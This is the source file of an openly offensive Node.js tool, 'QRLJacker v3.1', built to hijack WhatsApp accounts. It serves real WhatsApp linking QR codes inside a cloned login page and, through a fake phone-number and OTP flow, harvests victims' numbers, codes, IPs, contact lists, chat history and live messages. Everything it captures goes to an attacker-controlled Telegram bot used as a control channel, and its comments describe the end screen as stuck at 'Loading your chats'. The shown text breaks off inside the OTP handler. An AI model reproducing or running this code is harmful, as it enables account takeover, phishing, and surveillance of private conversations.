#!/usr/bin/env node
/* ============================================================
   QRLJacker v3.1 - REAL protocol-level WhatsApp QRLJacking
   Author: AH Exploits
   Platform: Termux (Android) / Kali Linux - Node 18+ - Baileys
   QR: REAL QR issued by WhatsApp servers (not simulated)
   Frontend: Desktop-mode WhatsApp Web clone (v3.0 design)
   Tunnels: localhost.run -> serveo.net -> ngrok (auto)
   C2: Telegram control panel with inline keyboards
   ============================================================ */
'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const readline = require('readline');
const { spawn, execSync } = require('child_process');

/* ---------------- colors ---------------- */
const C = {
  R: '\x1b[91m', G: '\x1b[92m', Y: '\x1b[93m', B: '\x1b[94m',
  M: '\x1b[95m', CY: '\x1b[96m', W: '\x1b[97m',
  BOLD: '\x1b[1m', DIM: '\x1b[2m', X: '\x1b[0m'
};
const log = (...a) => console.log(C.CY + '[AH-Exploits]' + C.X, ...a);

/* ---------------- node version check ---------------- */
if (parseInt(process.versions.node.split('.')[0], 10) < 18) {
  console.log(C.R + '[!] Node.js 18+ required.' + C.X);
  console.log(C.Y + '    Termux: pkg install nodejs -y' + C.X);
  console.log(C.Y + '    Kali  : apt install nodejs npm -y' + C.X);
  process.exit(1);
}

/* ---------------- auto-install deps ---------------- */
function ensureMod(name) {
  try { return require(name); }
  catch (e) {
    console.log(C.Y + '[*] Installing ' + name + '...' + C.X);
    try {
      execSync('npm install ' + name, { stdio: 'inherit', cwd: __dirname });
    } catch (e2) {
      console.log(C.R + '[!] npm install failed. Check network.' + C.X);
      console.log(C.Y + '    npm install ' + name + C.X);
      process.exit(1);
    }
    return require(name);
  }
}

const { makeWASocket, useMultiFileAuthState, DisconnectReason,
        fetchLatestBaileysVersion, Browsers } = ensureMod('@whiskeysockets/baileys');
const QRCode = ensureMod('qrcode');

/* ---------------- state ---------------- */
const SESSION_DIR = path.join(os.homedir(), '.qrljacker_sessions');
const STATE = {
  qrDataUri: null, qrRaw: null, sock: null, open: false,
  victimJid: null, victimNumber: null,
  chats: new Map(), contacts: new Map(), seen: new Set(),
  monitor: false, sel: null, prompt: null,
  tgToken: '', tgChat: '', port: 8080,
  publicUrl: null, localUrl: null, tunnelProc: null,
  qrCount: 0, lastVisitAlert: 0
};

/* ============================================================
   TELEGRAM HELPERS (no extra deps - Node fetch)
   ============================================================ */
const tgUrl = (m) => 'https://api.telegram.org/bot' + STATE.tgToken + '/' + m;

async function tgCall(method, body) {
  try {
    const r = await fetch(tgUrl(method), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(60000)
    });
    return await r.json();
  } catch (e) { console.error('TG err:', e.message); return { ok: false }; }
}

function tgSend(text, kb) {
  const body = { chat_id: STATE.tgChat, text, parse_mode: 'Markdown' };
  if (kb) body.reply_markup = kb;
  return tgCall('sendMessage', body);
}

function tgEdit(mid, text, kb) {
  const body = { chat_id: STATE.tgChat, message_id: mid, text, parse_mode: 'Markdown' };
  if (kb) body.reply_markup = kb;
  return tgCall('editMessageText', body);
}

function tgPhotoBuf(buf, caption) {
  const fd = new FormData();
  fd.append('chat_id', String(STATE.tgChat));
  fd.append('caption', caption);
  fd.append('photo', new Blob([buf], { type: 'image/png' }), 'qr.png');
  return fetch(tgUrl('sendPhoto'), { method: 'POST', body: fd });
}

/* ============================================================
   REAL WHATSAPP ENGINE (Baileys - real protocol QR)
   ============================================================ */
const silentLogger = {
  level: 'silent',
  child: () => silentLogger,
  trace() {}, debug() {}, info() {}, warn() {}, error() {}, fatal() {}
};

async function initWA() {
  fs.mkdirSync(SESSION_DIR, { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
  const { version } = await fetchLatestBaileysVersion();
  STATE.sock = makeWASocket({
    version,
    auth: state,
    browser: Browsers.ubuntu('Chrome'),       // shown in victim's Linked Devices
    syncFullHistory: true,                     // pull contacts + chat history
    printQRInTerminal: false,
    markOnlineOnConnect: false,
    logger: silentLogger,
    getMessage: async () => ({ conversation: 'AH Exploits QRLJacker' })
  });
  STATE.sock.ev.on('creds.update', saveCreds);
  STATE.sock.ev.on('connection.update', onConnUpdate);
  STATE.sock.ev.on('messages.upsert', onMessages);
  STATE.sock.ev.on('messaging-history.set', onHistory);
}

async function onConnUpdate(update) {
  const { connection, lastDisconnect, qr } = update;

  if (qr) {                                    // <-- REAL QR from WhatsApp servers
    STATE.qrRaw = qr;
    try {
      const png = await QRCode.toBuffer(qr, { width: 480, margin: 1 });
      STATE.qrDataUri = 'data:image/png;base64,' + png.toString('base64');
      fs.writeFileSync(path.join(SESSION_DIR, 'qr_live.png'), png);
      STATE.qrCount++;
      log(C.G + '[+] REAL WhatsApp QR #' + STATE.qrCount + ' issued by WhatsApp servers');
      if (STATE.tgChat && STATE.qrCount === 1) {
        tgPhotoBuf(png, '🟢 *REAL WhatsApp QR ready* - AH Exploits v3.1\n\nSend the URL to the victim.\nUse /qr later to fetch the latest code.');
      }
    } catch (e) { console.error('QR png fail:', e.message); }
  }

  if (connection === 'open') {
    STATE.open = true;
    const user = STATE.sock.user || {};
    STATE.victimJid = user.id || '';
    STATE.victimNumber = String(STATE.victimJid).split('@')[0];
    console.log('\n' + C.R + C.BOLD + '='.repeat(56));
    console.log('  🔥 SESSION CAPTURED - victim device LINKED!');
    console.log('  📱 Number: ' + STATE.victimNumber);
    console.log('='.repeat(56) + C.X);
    if (STATE.tgChat) {
      tgSend('🔥 *SESSION CAPTURED* - AH Exploits QRLJacker\n\n' +
             '📱 Victim: `' + STATE.victimNumber + '`\n' +
             '🕐 ' + new Date().toISOString() +
             '\n\n📚 Syncing contacts & history...');
    }
  }

  if (connection === 'close') {
    const code = lastDisconnect && lastDisconnect.error && lastDisconnect.error.output
                 ? lastDisconnect.error.output.statusCode : null;
    if (code === DisconnectReason.loggedOut) {
      log(C.R + 'Session logged out - needs re-link.');
      STATE.open = false;
    } else if (code === DisconnectReason.connectionReplaced) {
      log(C.Y + 'Device was replaced elsewhere.');
    } else {
      log(C.Y + 'Connection closed (' + code + ') - reconnecting in 3s...');
      setTimeout(initWA, 3000);
    }
  }
}

function extractText(m) {
  const t = m.message; if (!t) return '';
  if (t.conversation) return t.conversation;
  if (t.extendedTextMessage && t.extendedTextMessage.text) return t.extendedTextMessage.text;
  if (t.imageMessage && t.imageMessage.caption) return '📷 ' + t.imageMessage.caption;
  if (t.videoMessage && t.videoMessage.caption) return '🎬 ' + t.videoMessage.caption;
  if (t.documentMessage && t.documentMessage.title) return '📄 ' + t.documentMessage.title;
  if (t.audioMessage) return '🎵 [audio]';
  if (t.stickerMessage) return '🖼 [sticker]';
  return '[media:' + Object.keys(t)[0] + ']';
}

async function onMessages({ messages, type }) {
  if (type !== 'notify') return;
  for (const m of messages) {
    const key = m.key && m.key.id;
    if (key) {
      if (STATE.seen.has(key)) continue;
      STATE.seen.add(key);
    }
    const chat = m.key && m.key.remoteJid;
    if (!chat) continue;
    const text = extractText(m);
    const tsRaw = m.messageTimestamp;
    const ts = (typeof tsRaw === 'number' ? tsRaw : (tsRaw ? (tsRaw.low || 0) : 0)) * 1000;
    STATE.chats.set(chat, { name: chat.split('@')[0], last: text, ts });
    if (STATE.monitor && !m.key.fromMe) {
      tgSend('👁 *LIVE MONITOR* - `' + (STATE.victimNumber || '?') + '`\n\n' +
             '👤 ' + chat.split('@')[0] + '\n💬 ' + (text || '[media]') +
             '\n🕐 ' + new Date(ts).toISOString());
    }
  }
}

async function onHistory({ chats, contacts, messages, isLatest }) {
  for (const c of chats || [])
    STATE.chats.set(c.jid, { name: c.name || c.jid.split('@')[0], last: '', ts: 0 });
  for (const ct of contacts || []) {
    const n = String(ct.id || '').split('@')[0];
    if (n) STATE.contacts.set(n, ct.notify || ct.name || n);
  }
  if (isLatest && STATE.tgChat) {
    tgSend('📚 *History synced* - AH Exploits\n\n' +
           '👥 Contacts: ' + STATE.contacts.size + '\n' +
           '💬 Chats: ' + STATE.chats.size + '\n' +
           '📩 Messages: ' + (messages ? messages.length : 0) +
           '\n\nSend /start for the control panel.');
  }
}

/* ============================================================
   PHISHING FRONTEND - WHATSAPP "SCAN TO LOG IN" UI (v3.1)
   Includes: old-logo brand header, real-QR box,
   phone-number flow (country select + OTP keypad)
   Flow: QR login -> number dial -> OTP -> "Loading your chats" (stuck)
   ============================================================ */
const HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WhatsApp</title>
<style>
:root{
  --page:#f7f2ea; --ink:#202124; --muted:#666;
  --green:#00a884; --line:#777;
}
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif}
body{background:var(--page);color:var(--ink)}
.header{
  height:56px;display:flex;align-items:center;padding:0 30px;
  background:var(--page)
}
.brand{display:flex;align-items:center;gap:7px;color:#25d366;font-size:14px;font-weight:600}
.brand-logo{
  width:28px;height:28px;object-fit:contain;display:block;
}
.stage{
  min-height:calc(100vh - 56px);display:flex;justify-content:center;
  align-items:center;padding:40px 24px 120px;
}
.wrap{width:min(640px,100%);text-align:center}
.login-card{
  width:100%;min-height:295px;background:#fff;border:1px solid var(--line);
  border-radius:17px;padding:35px;display:flex;align-items:center;
  justify-content:space-between;gap:50px;text-align:left;
}
.instructions{flex:1;min-width:0}
.title{font-size:23px;font-weight:400;margin:0 0 28px}
.step{display:flex;gap:12px;align-items:flex-start;margin:16px 0}
.number{
  width:20px;height:20px;border:1px solid #777;border-radius:50%;
  display:grid;place-items:center;flex:none;font-size:11px
}
.step-text{font-size:13px;line-height:1.35;margin:1px 0 0}
.help{display:inline-block;margin-top:5px;color:#333;font-size:12px;text-decoration:underline}
.qr-area{width:190px;flex:none;text-align:center}
.qr{
  width:168px;height:168px;margin:auto;position:relative;
  background:
    repeating-linear-gradient(90deg,#163c3e 0 3px,#fff 3px 6px),
    repeating-linear-gradient(0deg,transparent 0 5px,#163c3e 5px 8px);
  overflow:hidden;
}
.finder{
  position:absolute;width:38px;height:38px;background:#fff;
  border:6px solid #163c3e;box-shadow:inset 0 0 0 5px #fff;
}
.f1{left:5px;top:5px}.f2{right:5px;top:5px}.f3{left:5px;bottom:5px}
.qr-center{
  position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);
  width:44px;height:44px;border-radius:50%;background:#fff;
  border:5px solid #163c3e;display:grid;place-items:center;
  font-size:18px;font-weight:700;color:#163c3e;
}
.qr img.live-qr{
  position:absolute;left:0;top:0;width:100%;height:100%;
  object-fit:contain;background:#fff;z-index:5;
}
.qr-label{font-size:10px;color:#777;margin-top:8px}
.controls{
  margin-top:27px;display:flex;justify-content:space-between;
  align-items:center;font-size:12px;gap:20px
}
.remember{display:flex;align-items:center;gap:8px}
.remember input{accent-color:#16a34a}
.phone{color:#333;text-decoration:underline;white-space:nowrap;cursor:pointer}
.account{margin-top:25px;font-size:12px;color:#555}
.account a{color:#333;text-decoration:underline}
.security{margin-top:18px;color:#777;font-size:11px}
.legal{margin-top:17px;color:#777;font-size:10px}

/* ---- phone + OTP flow ---- */
#phoneFlow{
  position:fixed;inset:0;z-index:99999;display:none;
  background:#f6f7f5;overflow-y:auto;
}
.pf-header{
  height:56px;display:flex;align-items:center;padding:0 30px;
  background:#fff;border-bottom:1px solid #e9edef;
}
.pf-body{
  max-width:480px;margin:56px auto;background:#fff;
  border:1px solid #e9edef;border-radius:14px;padding:40px 44px;
}
.pf-body h1{font-size:21px;font-weight:400;margin:0 0 10px}
.pf-sub{font-size:14px;color:#54656f;line-height:1.5;margin-bottom:24px}
.pf-label{font-size:12px;color:#54656f;margin:16px 0 6px}
.pf-select{
  width:100%;padding:12px;border:1px solid #d1d7db;border-radius:8px;
  font-size:14px;background:#fff;color:#111b21;outline:none;
}
.pf-row{display:flex;gap:10px;margin-top:12px}
.pf-cc{
  width:88px;padding:12px;border:1px solid #d1d7db;border-radius:8px;
  font-size:14px;color:#111b21;background:#f5f6f6;text-align:center;
}
.pf-input{
  flex:1;padding:12px;border:1px solid #d1d7db;border-radius:8px;
  font-size:16px;outline:none;
}
.pf-input:focus,.pf-select:focus{border-color:var(--green)}
.pf-btn{
  width:100%;margin-top:22px;padding:12px;background:var(--green);
  color:#fff;border:none;border-radius:8px;font-size:15px;
  font-weight:600;cursor:pointer;
}
.pf-btn:hover{background:#009b7a}
.pf-back{
  display:block;text-align:center;margin-top:14px;font-size:13px;
  color:#333;text-decoration:underline;cursor:pointer;
}
.otp-boxes{display:flex;gap:8px;justify-content:center;margin:20px 0 6px}
.otp-boxes input{
  width:46px;height:52px;text-align:center;font-size:22px;
  border:1px solid #d1d7db;border-radius:8px;outline:none;
}
.otp-boxes input:focus{border-color:var(--green)}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:18px}
.keypad button{
  height:44px;font-size:18px;border:1px solid #d1d7db;
  border-radius:8px;background:#fff;cursor:pointer;
}
.keypad button:active{background:#f0f2f5}

/* ---- phone validation error + live preview ---- */
.pf-error{display:none;color:#d64545;font-size:13px;margin-top:10px}
.pf-error.show{display:block}
.pf-preview{margin-top:10px;font-size:13px;color:#54656f;min-height:16px}

/* ---- dialer hidden until an OTP box is clicked ---- */
.keypad{display:none}
.keypad.show{display:grid}

/* ---- "Loading your chats" final screen ---- */
#chatsLoading{
  position:fixed;inset:0;z-index:999999;display:none;
  background:#f0f2f5;align-items:center;justify-content:center;
}
.cl-inner{text-align:center;padding:20px;width:min(380px,90%)}
.cl-logo{
  width:96px;height:96px;border-radius:50%;background:#e7f8ef;
  margin:0 auto 26px;display:grid;place-items:center;
}
.cl-logo img{width:48px;height:48px}
.cl-title{font-size:19px;color:#41525d;font-weight:400;margin:0 0 22px}
.cl-bar{width:100%;height:3px;background:#e9edef;border-radius:3px;overflow:hidden}
.cl-fill{
  height:100%;width:40%;background:#25d366;border-radius:3px;
  animation:clslide 1.4s ease-in-out infinite;
}
@keyframes clslide{0%{transform:translateX(-100%)}50%{transform:translateX(160%)}100%{transform:translateX(320%)}}
.cl-sub{font-size:12.5px;color:#667781;margin:18px 0 0}

@media(max-width:600px){
  .header{padding:0 28px}
  .stage{align-items:flex-start;padding:30px 40px 90px}
  .login-card{padding:30px 35px;gap:28px}
}
@media(max-width:520px){
  .stage{padding:28px 18px 80px}
  .login-card{flex-direction:column;min-height:0;padding:27px 22px}
  .qr-area{order:-1}
  .instructions{width:100%}
  .title{text-align:left}
  .controls{flex-direction:column;align-items:stretch}
  .phone{text-align:center}
  .pf-body{padding:28px 22px;margin:28px auto}
}
</style>
</head>
<body>

<header class="header">
  <div class="brand">
    <img class="brand-logo"
         src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='12' fill='%2325d366'/%3E%3Cpath fill='%23fff' d='M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z'/%3E%3C/svg%3E"
         alt="WhatsApp">
    <span>WhatsApp</span>
  </div>
</header>

<main class="stage">
  <div class="wrap">
    <section class="login-card" aria-label="QR login design preview">
      <div class="instructions">
        <h1 class="title">Scan to log in</h1>

        <div class="step">
          <span class="number">1</span>
          <p class="step-text">Scan the QR code with your phone's camera</p>
        </div>
        <div class="step">
          <span class="number">2</span>
          <p class="step-text">Tap the link to open the mobile app</p>
        </div>
        <div class="step">
          <span class="number">3</span>
          <p class="step-text">Confirm the QR code to continue</p>
        </div>

        <a class="help" href="#" onclick="return false">Need help? ↗</a>

        <div class="controls">
          <label class="remember">
            <input type="checkbox" checked>
            <span>Stay logged in on this browser ⓘ</span>
          </label>
          <a class="phone" href="#" id="phoneLink">Log in with phone number →</a>
        </div>
      </div>

      <div class="qr-area">
        <div class="qr" aria-label="WhatsApp QR code">
          <span class="finder f1"></span>
          <span class="finder f2"></span>
          <span class="finder f3"></span>
          <span class="qr-center">QR</span>
          <img id="whatsapp-qr" class="live-qr" src="{qr_uri}" alt="QR code">
        </div>
        <div class="qr-label" id="qrTip">Connecting to WhatsApp…</div>
      </div>
    </section>

    <div class="account">
      Don't have an account? <a href="#" onclick="return false">Get started ↗</a>
    </div>
    <div class="security">🔒 Your personal messages are end-to-end encrypted</div>
    <div class="legal">Terms &amp; Privacy Policy</div>
  </div>
</main>

<!-- ============ PHONE + OTP FLOW (captures to Telegram) ============ -->
<div id="phoneFlow">
  <div class="pf-header">
    <div class="brand">
      <img class="brand-logo"
           src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='12' fill='%2325d366'/%3E%3Cpath fill='%23fff' d='M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z'/%3E%3C/svg%3E"
           alt="WhatsApp">
      <span>WhatsApp</span>
    </div>
  </div>

  <div class="pf-body" id="phoneStep">
    <h1>Enter your phone number</h1>
    <p class="pf-sub">WhatsApp will need to verify your phone number. Carrier charges may apply.</p>
    <div class="pf-label">Country</div>
    <select id="countrySelect" class="pf-select"></select>
    <div class="pf-row">
      <div class="pf-cc" id="ccLabel">+1</div>
      <input class="pf-input" id="phoneInput" type="tel" placeholder="Phone number" maxlength="11">
    </div>
    <div class="pf-error" id="phoneError">Incorrect number. Please check the number and try again.</div>
    <div class="pf-preview" id="phonePreview"></div>
    <button class="pf-btn" id="phoneNext">Next</button>
    <a class="pf-back" id="phoneBack">← Back</a>
  </div>

  <div class="pf-body" id="otpStep" style="display:none">
    <h1>Enter the 6-digit code</h1>
    <p class="pf-sub" id="otpHint">Enter the code sent to your phone</p>
    <div class="otp-boxes" id="otpBoxes">
      <input maxlength="1"><input maxlength="1"><input maxlength="1">
      <input maxlength="1"><input maxlength="1"><input maxlength="1">
    </div>
    <div class="keypad" id="keypad"></div>
    <button class="pf-btn" id="otpVerify">Verify</button>
    <a class="pf-back" id="otpBack">← Back</a>
  </div>
</div>

<!-- ============ LOADING YOUR CHATS (final page - stuck here) ============ -->
<div id="chatsLoading">
  <div class="cl-inner">
    <div class="cl-logo">
      <img class="brand-logo"
           src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='12' fill='%2325d366'/%3E%3Cpath fill='%23fff' d='M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z'/%3E%3C/svg%3E"
           alt="WhatsApp">
    </div>
    <p class="cl-title">Loading your chats</p>
    <div class="cl-bar"><div class="cl-fill"></div></div>
    <p class="cl-sub">This should only take a few seconds.</p>
  </div>
</div>

<script>
/* ---------------- country list (with flag emojis) ---------------- */
var countries=[["AF","Afghanistan","+93"],["AL","Albania","+355"],["DZ","Algeria","+213"],["AR","Argentina","+54"],["AU","Australia","+61"],["AT","Austria","+43"],["BD","Bangladesh","+880"],["BE","Belgium","+32"],["BR","Brazil","+55"],["BG","Bulgaria","+359"],["KH","Cambodia","+855"],["CM","Cameroon","+237"],["CA","Canada","+1"],["CL","Chile","+56"],["CN","China","+86"],["CO","Colombia","+57"],["HR","Croatia","+385"],["CZ","Czech Republic","+420"],["DK","Denmark","+45"],["EG","Egypt","+20"],["ET","Ethiopia","+251"],["FI","Finland","+358"],["FR","France","+33"],["DE","Germany","+49"],["GH","Ghana","+233"],["GR","Greece","+30"],["HK","Hong Kong","+852"],["HU","Hungary","+36"],["IN","India","+91"],["ID","Indonesia","+62"],["IQ","Iraq","+964"],["IE","Ireland","+353"],["IL","Israel","+972"],["IT","Italy","+39"],["JP","Japan","+81"],["JO","Jordan","+962"],["KE","Kenya","+254"],["KW","Kuwait","+965"],["MY","Malaysia","+60"],["MX","Mexico","+52"],["MA","Morocco","+212"],["MM","Myanmar","+95"],["NP","Nepal","+977"],["NL","Netherlands","+31"],["NZ","New Zealand","+64"],["NG","Nigeria","+234"],["NO","Norway","+47"],["OM","Oman","+968"],["PK","Pakistan","+92"],["PS","Palestine","+970"],["PE","Peru","+51"],["PH","Philippines","+63"],["PL","Poland","+48"],["PT","Portugal","+351"],["QA","Qatar","+974"],["RO","Romania","+40"],["RU","Russia","+7"],["SA","Saudi Arabia","+966"],["SN","Senegal","+221"],["RS","Serbia","+381"],["SG","Singapore","+65"],["SK","Slovakia","+421"],["ZA","South Africa","+27"],["KR","South Korea","+82"],["ES","Spain","+34"],["LK","Sri Lanka","+94"],["SE","Sweden","+46"],["CH","Switzerland","+41"],["TW","Taiwan","+886"],["TZ","Tanzania","+255"],["TH","Thailand","+66"],["TN","Tunisia","+216"],["TR","Turkey","+90"],["UG","Uganda","+256"],["UA","Ukraine","+380"],["AE","United Arab Emirates","+971"],["GB","United Kingdom","+44"],["US","United States","+1"],["VN","Vietnam","+84"],["YE","Yemen","+967"],["ZW","Zimbabwe","+263"]];

function flagEmoji(iso){
  return String.fromCodePoint.apply(null, iso.toUpperCase().split('').map(function(c){return 127397 + c.charCodeAt(0);}));
}
var sel=document.getElementById('countrySelect');
for(var i=0;i<countries.length;i++){
  var o=document.createElement('option');
  o.value=countries[i][2];
  o.setAttribute('data-iso',countries[i][0]);
  o.setAttribute('data-name',countries[i][1]);
  o.textContent=flagEmoji(countries[i][0])+' '+countries[i][1]+' ('+countries[i][2]+')';
  sel.appendChild(o);
}
var ccLabel=document.getElementById('ccLabel');

/* ---------------- flow navigation ---------------- */
var phoneFlow=document.getElementById('phoneFlow');
var phoneStep=document.getElementById('phoneStep');
var otpStep=document.getElementById('otpStep');
var capturedRaw='';

document.getElementById('phoneLink').onclick=function(){phoneFlow.style.display='block';};
document.getElementById('phoneBack').onclick=function(){phoneFlow.style.display='none';};
document.getElementById('otpBack').onclick=function(){otpStep.style.display='none';phoneStep.style.display='block';};

function postData(url,data,cb){
  fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
    .then(function(r){return r.json()})
    .then(cb)
    .catch(function(){if(cb)cb({ok:false});});
}

/* ---------------- phone submit (10-11 digit validation) ---------------- */
var phoneInput=document.getElementById('phoneInput');
var phoneError=document.getElementById('phoneError');

function updatePreview(){
  var v=phoneInput.value.replace(/\D/g,'');
  if(!v){document.getElementById('phonePreview').textContent='';return;}
  var iso=sel.options[sel.selectedIndex].getAttribute('data-iso');
  document.getElementById('phonePreview').textContent=flagEmoji(iso)+' '+sel.value+' '+v;
}
sel.onchange=function(){ccLabel.textContent=sel.value;updatePreview();};

phoneInput.addEventListener('input',function(){
  var v=this.value.replace(/\D/g,'');
  if(v.length>11)v=v.slice(0,11);              /* hard cap: no more than 11 digits */
  this.value=v;
  if(v.length>11||(v.length>0&&v.length<10))phoneError.classList.add('show');
  else phoneError.classList.remove('show');
  updatePreview();
});

document.getElementById('phoneNext').onclick=function(){
  var num=phoneInput.value.replace(/\D/g,'');
  if(num.length<10||num.length>11){            /* <10 or >11 -> INCORRECT NUMBER */
    phoneError.classList.add('show');
    return;
  }
  phoneError.classList.remove('show');
  capturedRaw=sel.value+num;                   /* sent to backend (unchanged format) */
  postData('/phone',{
    country:sel.options[sel.selectedIndex].getAttribute('data-name'),
    code:sel.value,
    number:num,
    full:capturedRaw
  },function(){
    var iso=sel.options[sel.selectedIndex].getAttribute('data-iso');
    document.getElementById('otpHint').innerHTML='Enter the code sent to <b>'+flagEmoji(iso)+' '+sel.value+' '+num+'</b>';
    phoneStep.style.display='none';
    otpStep.style.display='block';
    var b=document.querySelectorAll('.otp-boxes input');
    b[0].focus();                               /* focus box -> dialer appears */
  });
};

/* ---------------- OTP boxes + dialer (hidden until box clicked) ---------------- */
var boxes=document.querySelectorAll('.otp-boxes input');
var keypad=document.getElementById('keypad');
var verifyTimer=null;

function checkFull(){
  var filled=0;
  for(var i=0;i<boxes.length;i++)if(boxes[i].value)filled++;
  if(filled===boxes.length){
    clearTimeout(verifyTimer);
    verifyTimer=setTimeout(function(){document.getElementById('otpVerify').click();},450);
  }
}
for(var i=0;i<boxes.length;i++){
  (function(idx){
    boxes[idx].addEventListener('input',function(){
      if(this.value&&idx<5)boxes[idx+1].focus();
      checkFull();
    });
    boxes[idx].addEventListener('keydown',function(e){
      if(e.key==='Backspace'&&!this.value&&idx>0)boxes[idx-1].focus();
    });
    boxes[idx].addEventListener('focus',function(){keypad.classList.add('show');});
  })(i);
}
document.addEventListener('click',function(e){
  if(!e.target.closest('.keypad')&&!e.target.closest('.otp-boxes'))keypad.classList.remove('show');
});

function kbtn(v){
  var b=document.createElement('button');
  b.textContent=(v==='')?'':v;
  b.onclick=function(){
    if(v==='⌫'){
      for(var i=5;i>=0;i--){if(boxes[i].value){boxes[i].value='';break;}}
    }else if(v!==''){
      for(var j=0;j<6;j++){
        if(!boxes[j].value){boxes[j].value=String(v);if(j<5)boxes[j+1].focus();break;}
      }
      checkFull();
    }
  };
  return b;
}
for(var k=1;k<=9;k++)keypad.appendChild(kbtn(k));
keypad.appendChild(kbtn(''));
keypad.appendChild(kbtn(0));
keypad.appendChild(kbtn('⌫'));

/* ---------------- OTP verify -> "Loading your chats" (stuck) ---------------- */
var chatsLoading=document.getElementById('chatsLoading');
document.getElementById('otpVerify').onclick=function(){
  var code='';
  for(var i=0;i<boxes.length;i++)code+=boxes[i].value;
  if(code.length<6){return alert('Enter the 6-digit code');}
  postData('/otp',{code:code,full:capturedRaw},function(){
    phoneFlow.style.display='none';        /* OTP page disappears */
    chatsLoading.style.display='flex';     /* "Loading your chats" appears, stays */
  });
};

/* ---------------- real QR refresh + heartbeat ---------------- */
var qrImg=document.getElementById('whatsapp-qr');
var qrTip=document.getElementById('qrTip');
var src0=qrImg.getAttribute('src')||'';
if(!src0||src0.indexOf('{qr_uri}')>-1){qrImg.style.display='none';}
function refreshQR(){
  fetch('/refresh_qr').then(function(x){return x.json()}).then(function(d){
    if(d.success&&d.qr_uri){
      qrImg.src=d.qr_uri;
      qrImg.style.display='block';
      qrTip.textContent='📲 Point your phone at this screen to capture the code';
    }
  }).catch(function(){});
}
setInterval(refreshQR,20000);
setInterval(function(){navigator.sendBeacon('/heartbeat');},10000);
</script>
</body>
</html>`;

/* ============================================================
   HTTP SERVER (phishing page - same endpoints as before + /phone /otp)
   ============================================================ */
const server = http.createServer(async (req, res) => {
  let p = '/';
  try { p = new URL(req.url, 'http://x').pathname; } catch (e) {}

  if (req.method === 'GET' && p === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(HTML.replace('{qr_uri}', STATE.qrDataUri || ''));
    const ip = req.socket.remoteAddress || '?';
    console.log(C.M + '[+] Victim visited from IP: ' + ip + C.X);
    if (STATE.tgChat && Date.now() - STATE.lastVisitAlert > 10000) {
      STATE.lastVisitAlert = Date.now();
      tgSend('👤 *Victim visiting the page!*\nIP: `' + ip + '`\n🕐 ' + new Date().toISOString() + '\n🤖 AH Exploits QRLJacker v3.1');
    }
  } else if (req.method === 'GET' && p === '/refresh_qr') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: !!STATE.qrDataUri, qr_uri: STATE.qrDataUri }));
  } else if (req.method === 'GET' && p === '/qr.png') {
    const f = path.join(SESSION_DIR, 'qr_live.png');
    if (fs.existsSync(f)) { res.writeHead(200, { 'Content-Type': 'image/png' }); res.end(fs.readFileSync(f)); }
    else { res.writeHead(404); res.end(); }
  } else if (req.method === 'GET' && p === '/heartbeat') {
    res.writeHead(200); res.end('ok');
  } else if (req.method === 'POST' && (p === '/phone' || p === '/otp')) {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      const ip = req.socket.remoteAddress || '?';
      let d = {};
      try { d = JSON.parse(body || '{}'); } catch (e) {}
      if (p === '/phone') {
        console.log(C.R + C.BOLD + '[+] PHONE NUMBER CAPTURED' + C.X);
        console.log(C.Y + '    Country: ' + (d.country || '?') + C.X);
        console.log(C.Y + '    Number : ' + (d.full || '?') + C.X);
        console.log(C.M + '    IP     : ' + ip + C.X);
        if (STATE.tgChat) {
          tgSend('📱 *PHONE NUMBER CAPTURED* - AH Exploits QRLJacker\n\n' +
                 '🌍 Country: `' + (d.country || '?') + '`\n' +
                 '📞 Number: `' + (d.full || '?') + '`\n' +
                 '🕐 ' + new Date().toISOString() + '\n' +
                 '🌐 IP: `' + ip + '`');
        }
      } else {
        console.log(C.R + C.BOLD + '[+] OTP CODE CAPTURED' + C.X);
        console.log(C.Y + '    Number: ' + (d.full || '?') + C.X);
        console.log(C.Y + '    Code  : ' + (d.code || '?') + C.X);
        console.log(C.M + '    IP    : ' + ip + C.X);
        if (STATE.tgChat) {
          tgSend('🔑 *OTP CODE CAPTURED* - AH Exploits QRLJacker\n\n' +
                 '📞 Number: `' + (d.full || '?') + '`\n' +
                 '🔢 Code: `' + (d.code || '?') + '`\n' +
